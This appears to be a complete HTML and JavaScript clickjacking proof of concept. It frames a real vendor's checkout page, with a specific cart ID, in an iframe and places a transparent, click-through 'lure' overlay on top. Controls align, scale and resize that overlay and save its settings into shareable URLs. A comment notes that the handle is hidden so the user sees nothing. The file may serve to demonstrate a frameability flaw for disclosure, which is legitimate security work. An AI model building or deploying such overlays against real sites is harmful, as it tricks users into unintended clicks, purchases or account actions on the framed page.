<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
<title>Clickjacking PoC – Draggable Overlay</title>
<style>
  :root {
    --bg:#0b1220;
    --fg:#e5e7eb;
    --panel:#111827cc;
    --border:#374151;
  }
  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial}
  /* Victim page */
  #victim{
    position:absolute;inset:0;width:100%;height:100%;border:0;z-index:1;
    opacity:1;transform-origin:top left; /* scale via JS */
  }
  /* Optional alignment grid */
  .hint{position:absolute;inset:0;z-index:2;pointer-events:none;display:none}
  .hint.on{
    display:block;
    background-image:
      linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),
      linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);
    background-size:24px 24px;
  }

  /* Click-through overlay area (transparent) */
  #lure{
    position:absolute;z-index:3;background:transparent;border-radius:14px;
    /* IMPORTANT: in LIVE mode we set pointer-events:none (click-through). In DRAG mode, handle captures events. */
  }
  /* Visible dashed outline for debugging (toggled from panel) */
  #lure.debug{outline:2px dashed rgba(255,255,255,.25)}

  /* Drag handle (small circle) – only this captures the drag */
  #handle{
    position:absolute;top:-14px;left:-14px;width:28px;height:28px;border-radius:999px;
    background:rgba(99,102,241,.9);box-shadow:0 6px 14px rgba(0,0,0,.35);
    z-index:4;cursor:move;display:flex;align-items:center;justify-content:center;
    color:#fff;font-size:12px;font-weight:700;user-select:none;
  }
  /* Hidden in LIVE mode so user tidak melihat apa-apa */
  #handle.hidden{display:none}

  /* Control panel */
  #panel{
    position:fixed;left:12px;right:12px;bottom:12px;z-index:5;
    display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:center;
    background:var(--panel);backdrop-filter:blur(8px);
    border:1px solid var(--border);border-radius:12px;padding:8px;
  }
  #panel button,#panel a,#panel .chip{
    appearance:none;border:1px solid var(--border);background:#0b1220;color:var(--fg);
    padding:8px 10px;border-radius:10px;font-size:13px;text-decoration:none
  }
  #panel .chip{opacity:.85}
  #panel .sep{width:1px;height:28px;background:var(--border);opacity:.6;margin:0 4px}

  /* Tiny toast */
  #toast{
    position:fixed;top:12px;left:50%;transform:translateX(-50%);
    background:#111827;color:var(--fg);border:1px solid var(--border);
    padding:10px 12px;border-radius:10px;z-index:6;display:none;font-size:13px
  }
</style>
</head>
<body>

<!-- Victim iframe (target URL already set) -->
<iframe id="victim"
  sandbox="allow-scripts allow-forms allow-same-origin"
  referrerpolicy="no-referrer"
  src="https://tangem.com/en/checkout?cart_id=cart_01K1DR3HEND5AV2QGZMXCVMQSE">
</iframe>

<!-- Optional alignment grid -->
<div id="hint" class="hint"></div>

<!-- Transparent click area (draggable) -->
<div id="lure" style="left:50%;top:calc(100% - 144px);width:88vw;max-width:680px;height:56px;">
  <div id="handle">≡</div>
</div>

<!-- Control panel -->
<div id="panel" role="group" aria-label="controls">
  <span class="chip">Mode: <b id="modeLabel">LIVE</b></span>
  <button id="toggleMode" title="Toggle Live/Drag">Toggle Mode</button>
  <div class="sep"></div>
  <button id="nudgeUp">↑ 2px</button>
  <button id="nudgeDown">↓ 2px</button>
  <button id="nudgeLeft">← 2px</button>
  <button id="nudgeRight">→ 2px</button>
  <div class="sep"></div>
  <button id="shrinkH">H−</button>
  <button id="growH">H+</button>
  <button id="shrinkW">W−</button>
  <button id="growW">W+</button>
  <div class="sep"></div>
  <button id="scaleMinus">Scale −</button>
  <span class="chip">scale=<b id="scaleVal">1</b></span>
  <button id="scalePlus">Scale +</button>
  <div class="sep"></div>
  <button id="toggleGrid">Grid</button>
  <button id="toggleOutline">Outline</button>
  <div class="sep"></div>
  <a href="#" id="copyUrl">Copy URL</a>
  <button id="reset">Reset</button>
</div>

<div id="toast"></div>

<script>
(function(){
  const frame = document.getElementById('victim');
  const lure  = document.getElementById('lure');
  const handle= document.getElementById('handle');
  const hint  = document.getElementById('hint');
  const toast = document.getElementById('toast');
  const modeLabel = document.getElementById('modeLabel');
  const scaleVal  = document.getElementById('scaleVal');

  // --- State (can be persisted/tuned) ---
  const qs = new URLSearchParams(location.search);
  let scale = parseFloat(qs.get('scale') || localStorage.getItem('scale') || '1');
  let x = parseInt(qs.get('x') || localStorage.getItem('x') || '0', 10);
  let y = parseInt(qs.get('y') || localStorage.getItem('y') || '0', 10);
  let w = parseInt(qs.get('w') || localStorage.getItem('w') || Math.floor(window.innerWidth*0.88), 10);
  let h = parseInt(qs.get('h') || localStorage.getItem('h') || '56', 10);
  let showgrid = (qs.get('showgrid') || localStorage.getItem('showgrid') || '0') === '1';
  let outline = (qs.get('outline') || localStorage.getItem('outline') || '0') === '1';
  let liveMode = (qs.get('mode') || localStorage.getItem('mode') || 'live') === 'live';

  // position lure using x,y relative moves from its initial CSS
  function readLureLT(){
    const r = lure.getBoundingClientRect();
    return {left: r.left + window.scrollX, top: r.top + window.scrollY};
  }
  // Apply attributes
  function apply(){
    frame.style.transform = `translate(${x}px,${y}px) scale(${scale})`;
    lure.style.width = w + 'px';
    lure.style.height = h + 'px';

    scaleVal.textContent = String(scale);

    // Modes
    if(liveMode){
      lure.style.pointerEvents = 'none';   // click-through
      handle.classList.add('hidden');      // handle hidden
      modeLabel.textContent = 'LIVE';
    }else{
      lure.style.pointerEvents = 'auto';   // we want to drag via handle
      handle.classList.remove('hidden');
      modeLabel.textContent = 'DRAG';
    }
    hint.classList.toggle('on', showgrid);
    lure.classList.toggle('debug', outline);

    // Persist
    localStorage.setItem('scale', scale);
    localStorage.setItem('x', x);
    localStorage.setItem('y', y);
    localStorage.setItem('w', w);
    localStorage.setItem('h', h);
    localStorage.setItem('showgrid', showgrid ? '1':'0');
    localStorage.setItem('outline', outline ? '1':'0');
    localStorage.setItem('mode', liveMode ? 'live':'drag');
  }
  apply();

  // ---- Dragging via handle ----
  let dragging = false;
  let start = {mx:0,my:0, left:0, top:0};
  function onDown(ev){
    if(liveMode) return;
    dragging = true;
    const pt = ('touches' in ev) ? ev.touches[0] : ev;
    start.mx = pt.clientX; start.my = pt.clientY;
    const r = lure.getBoundingClientRect();
    start.left = r.left; start.top = r.top;
    ev.preventDefault();
  }
  function onMove(ev){
    if(!dragging) return;
    const pt = ('touches' in ev) ? ev.touches[0] : ev;
    const dx = pt.clientX - start.mx;
    const dy = pt.clientY - start.my;
    // Move lure box in page coordinates
    lure.style.left  = (start.left + dx) + 'px';
    lure.style.top   = (start.top  + dy) + 'px';
  }
  function onUp(){
    if(!dragging) return;
    dragging = false;
    // After drop, recompute x/y so that overlay alignment remains if page reloads.
    // We adjust x/y (frame transform) by the delta of lure movement relative to its last position.
    // Simpler approach: store absolute lure left/top as CSS inline and keep them.
    const r = lure.getBoundingClientRect();
    // No-op: CSS already reflects new position.
    toastMsg('Overlay moved');
  }

  handle.addEventListener('mousedown', onDown);
  window.addEventListener('mousemove', onMove);
  window.addEventListener('mouseup', onUp);
  handle.addEventListener('touchstart', onDown, {passive:false});
  window.addEventListener('touchmove', onMove, {passive:false});
  window.addEventListener('touchend', onUp);

  // --- Nudge controls (adjust transform x/y) ---
  const step = 2;
  document.getElementById('nudgeUp').onclick    = ()=>{ y -= step; apply(); };
  document.getElementById('nudgeDown').onclick  = ()=>{ y += step; apply(); };
  document.getElementById('nudgeLeft').onclick  = ()=>{ x -= step; apply(); };
  document.getElementById('nudgeRight').onclick = ()=>{ x += step; apply(); };

  // Resize overlay box
  document.getElementById('shrinkH').onclick = ()=>{ h = Math.max(20, h-4); apply(); };
  document.getElementById('growH').onclick   = ()=>{ h = h+4; apply(); };
  document.getElementById('shrinkW').onclick = ()=>{ w = Math.max(60, w-8); apply(); };
  document.getElementById('growW').onclick   = ()=>{ w = w+8; apply(); };

  // Scale victim
  document.getElementById('scaleMinus').onclick = ()=>{ scale = Math.max(0.5, +(scale - 0.02).toFixed(2)); apply(); };
  document.getElementById('scalePlus').onclick  = ()=>{ scale = Math.min(2.0, +(scale + 0.02).toFixed(2)); apply(); };

  // Grid + Outline
  document.getElementById('toggleGrid').onclick = ()=>{ showgrid = !showgrid; apply(); };
  document.getElementById('toggleOutline').onclick = ()=>{ outline = !outline; apply(); };

  // Mode toggle
  document.getElementById('toggleMode').onclick = ()=>{
    liveMode = !liveMode; apply();
    toastMsg(liveMode ? 'LIVE (click-through enabled)' : 'DRAG (use handle to move)');
  };

  // Copy URL with params
  document.getElementById('copyUrl').onclick = (e)=>{
    e.preventDefault();
    const u = new URL(location.href);
    u.searchParams.set('scale', String(scale));
    u.searchParams.set('x', String(x));
    u.searchParams.set('y', String(y));
    u.searchParams.set('w', String(w));
    u.searchParams.set('h', String(h));
    u.searchParams.set('showgrid', showgrid ? '1':'0');
    u.searchParams.set('outline', outline ? '1':'0');
    u.searchParams.set('mode', liveMode ? 'live':'drag');
    const s = u.toString();
    (navigator.clipboard?.writeText(s) || Promise.reject()).then(
      ()=>toastMsg('URL copied'),
      ()=>{ prompt('Copy URL manually:', s); }
    );
  };

  // Reset
  document.getElementById('reset').onclick = ()=>{
    scale = 1; x = 0; y = 0; w = Math.floor(window.innerWidth*0.88); h = 56;
    showgrid = false; outline = false; liveMode = true;
    lure.style.left = '50%'; lure.style.top = 'calc(100% - 144px)'; // default CSS
    apply(); toastMsg('Reset to defaults');
  };

  // Arrow keys for fine nudge (desktop)
  window.addEventListener('keydown', (e)=>{
    if(e.key==='ArrowUp'){ y-=step; apply(); }
    if(e.key==='ArrowDown'){ y+=step; apply(); }
    if(e.key==='ArrowLeft'){ x-=step; apply(); }
    if(e.key==='ArrowRight'){ x+=step; apply(); }
  });

  function toastMsg(msg){
    toast.textContent = msg; toast.style.display='block';
    clearTimeout(toast._t); toast._t = setTimeout(()=>toast.style.display='none', 1200);
  }

})();
</script>
</body>
</html>

